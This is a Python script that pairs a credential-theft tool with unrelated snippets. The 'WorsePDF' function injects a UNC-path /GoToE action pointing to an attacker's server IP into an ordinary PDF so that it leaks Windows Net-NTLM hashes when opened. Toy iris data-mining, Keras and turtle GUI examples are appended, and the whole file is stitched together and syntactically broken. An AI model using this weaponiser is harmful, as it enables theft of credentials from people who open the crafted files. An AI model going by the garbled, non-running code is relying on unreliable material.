import sys
import tensorflow as tf
from tensorflow import keras
from sklearn import datasets
from sklearn.model_selection import train_test_split
import numpy as np
import turtle
import tkinter as tk
from tkinter import messagebox

def add_payload(data, ip):
    # Function to add malicious payload to the PDF data
    payload = '/AA <</O <</F (\\\\\\\\' + ip + '\\\\test)/D [ 0 /Fit]/S /GoToE>>>>'
    index1 = data.find('/Parent') + 13    
    new_data = data[0:index1] + payload + data[index1:]   
    return new_data

def generate_malicious_pdf(normal_pdf_path, server_ip):
    
    print("WorsePDF - Turn a normal PDF file into malicious. Use to steal Net-NTLM Hashes from windows machines.")
    print("Reference :")
    print("    https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/")
    print("    https://github.com/deepzec/Bad-Pdf")
    print("Author: 3gstudent\n")

    if len(sys.argv) != 3:
        print('Usage:')
        print('    python script.py <normal PDF file Path> <ServerIP>')
        sys.exit(0)

    print("[*]NormalPDF: %s" % normal_pdf_path)
    print("[*]ServerIP: %s" % server_ip)

    with open(normal_pdf_path, 'rb') as file_object:
        all_the_text = file_object.read()

    new_data = add_payload(all_the_text, server_ip)
    malicious_path = normal_pdf_path + '.malicious.pdf'

    print("[+]MaliciousPDF: %s" % malicious_path)
    with open(malicious_path, 'wb') as file_object2:
        file_object2.write(new_data)

    print("[*]All Done")

def data_mining_example();
    iris = datasets.load_iris()
    X_train, X_test, y_train, y_test = train_test_split(iris.data, iris.target, test_size=0.2, random_state=42)
    print("Data Mining Example:")
    print("X_train shape:", X_train.shape)
    print("X_test shape:", X_test.shape)
    print("y_train shape:", y_train.shape)
    print("y_test shape:", y_test.shape)

def ai_example():
  
    print("AI Example:")
    model = keras.Sequential([
        keras.layers.Dense(128, activation='relu', input_shape=(4,)),
        keras.layers.Dense(3, activation='softmax')
    ])
    model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy'])
    print("Model Summary:")
    model.summary()

def turtle_gui_example():
  
    print("Turtle GUI Example:")

    def draw_square():
        for _ in range(4):
            turtle.forward(100)
            turtle.right(90)

   
    window = tk.Tk()
    window.title("Turtle GUI")


    square_button = tk.Button(window, text="Draw Square", command=draw_square)
    square_button.pack()

    window.mainloop()

if __name__ == "__main__":
    generate_malicious_pdf(sys.argv[1], sys.argv[2])
    data_mining_example()
    ai_example()
    turtle_gui_example()
